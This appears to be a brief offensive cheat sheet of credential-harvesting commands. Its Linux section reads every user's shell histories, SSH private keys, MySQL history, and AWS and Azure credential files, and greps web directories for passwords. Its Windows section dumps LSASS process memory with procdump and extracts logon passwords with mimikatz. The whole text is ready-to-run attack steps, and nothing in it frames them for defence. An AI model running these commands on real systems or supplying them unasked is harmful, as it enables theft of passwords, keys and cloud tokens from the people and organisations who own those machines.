## Linux Password harvesting
ps -efw
last -f /var/log/btmp
cat /home/*/.*history
grep -iR password /var/www
cat /home/*/.ssh/id*
cat /home/*/mysql_history
cat /home/*/.aws/credentials
cat /home/*/.azure/accessTokens.json

## Mimikatz
procdump64.exe -accepteula -ma lsass.exe lsass.dmp 
mimikatz
	sekurlsa::minidump lsass.dmp
	sekurlsa::LogonPasswords full